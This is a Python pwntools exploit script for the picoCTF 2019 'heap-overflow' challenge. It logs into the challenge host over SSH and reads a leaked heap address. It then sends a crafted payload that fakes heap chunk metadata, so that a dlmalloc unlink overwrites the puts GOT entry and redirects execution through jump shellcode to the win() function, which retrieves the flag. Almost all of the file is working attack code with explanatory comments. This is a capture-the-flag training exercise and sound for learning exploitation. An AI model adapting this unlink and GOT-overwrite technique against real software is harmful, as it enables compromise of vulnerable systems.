#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --user xxx --pass 'xxx' --path /problems/heap-overflow_4_3753f93c50c60685d83eea78243a85a0/vuln
from pwn import *
import sys

# Set up pwntools for the correct architecture
# ELF tutorial: https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER
password = args.PASSWORD
remote_path = '/problems/heap-overflow_4_3753f93c50c60685d83eea78243a85a0/vuln'
remote_dir = '/problems/heap-overflow_4_3753f93c50c60685d83eea78243a85a0'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        # `cwd` is needed here because the `vuln` executable does not use absolute paths, so we
        # must be in the folder that contains the flag.
        return shell.process([remote_path] + argv, cwd=remote_dir, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


win_addr = exe.symbols['win']

log.info("win address: {}".format(hex(win_addr)))

io = start()

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())
log.info("fullname address: {}".format(hex(address)))

# jump over the nop area, which will be destroyed by `unlink()` and push the
# address of the `win()` function to the return address
shell_code = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols["win"])))
log.info("shellcode:\n{}".format(hexdump(shell_code)))

# add the shellcode and pad to the end of the block of memory, then create
# the heading of a new fake block of memory with the `PREV_INUSE` bit
# set to 0 followed by setting the length of the next block (`name`) to `-4`, thus
# dlmalloc will believe the third block's `PREV_INUSE` is 0 and that the second
# block is unallocated and can be consolidated with the first block
payload = shell_code + (b'B' * (664-len(shell_code))) + p32(-4, sign="signed")*2
# finally, overwrite the forward pointer to the address of `puts()`
# in the Global Offset Table (the function to overwrite the return address of)
# and the backward pointer to the address for the function specified by the
# forward pointer to return to (our shell code, which the program tells us the
# location of when it runs)
payload += p32(exe.got["puts"] - 12) + p32(address)
log.info("payload:\n{}".format(hexdump(payload)))

io.sendlineafter("Input fullname", payload)
io.sendlineafter("Input lastname", "0")

io.recvuntil("\n") # remove the newline from the flag
flag = io.recvuntil("}")
log.success(flag.decode("ascii"))
